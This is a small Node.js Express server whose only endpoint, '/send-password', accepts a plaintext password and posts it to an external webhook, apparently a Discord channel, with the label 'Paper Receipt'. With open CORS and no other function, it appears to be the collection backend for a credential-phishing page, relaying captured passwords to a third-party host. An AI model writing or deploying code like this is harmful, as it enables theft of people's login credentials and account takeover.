require("dotenv").config();
const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(cors());

app.post("/send-password", async (req, res) => {
    const { password } = req.body;

    if (!password) {
        return res.status(400).json({ success: false, error: "No password provided" });
    }

    try {
        await axios.post(process.env.WEBHOOK_URL, {
            content: `New **Paper Receipt** password: ${password}`
        });
        res.json({ success: true, message: "Password sent!" });
    } catch (error) {
        console.error("Failed to send password:", error);
        res.status(500).json({ success: false, error: "Failed to send password" });
    }
});

app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
